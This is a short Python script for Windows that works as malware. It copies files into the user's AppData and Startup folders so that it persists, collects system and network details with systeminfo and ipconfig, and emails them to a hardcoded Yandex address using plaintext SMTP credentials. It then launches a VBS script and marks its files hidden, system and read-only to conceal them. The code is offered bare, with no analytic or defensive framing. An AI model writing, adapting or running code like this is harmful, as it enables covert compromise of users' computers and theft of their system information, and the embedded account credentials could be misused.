import os
import smtplib
from email.message import EmailMessage
import time

os.system("xcopy /e /Y "+os.getcwd()+os.sep+"win32 "+os.environ["USERPROFILE"]+os.sep+"appdata")
os.system("xcopy /e /Y "+os.getcwd()+os.sep+'k "'+os.environ["USERPROFILE"]+os.sep+'Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"')
os.system('systeminfo >> win32/system.txt')
os.system('ipconfig /all >> win32/system.txt')
msj=EmailMessage()
msj["Subject"]=time.ctime()+os.environ["USERPROFILE"]
msj["From"]="xnoforss@yandex.com"
msj["To"]="xnoforss@yandex.com"
with open("win32/system.txt","rb") as f:
    msj.add_attachment(f.read(),maintype="application",subtype="octet-stream",filename=f.name)
with smtplib.SMTP_SSL("smtp.yandex.com",465) as smtp:
    smtp.login("xnoforss@yandex.com","dwM4YLGg8fJizK2")
    smtp.send_message(msj)
os.system('start "'+os.environ["USERPROFILE"]+os.sep+'Appdata\win32\on.vbs"')
os.system('attrib +s +h +r "'+os.environ["USERPROFILE"]+os.sep+'Appdata\win32"')
os.system('attrib +s +h +r "'+os.environ["USERPROFILE"]+os.sep+'Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winstart.lnk"')




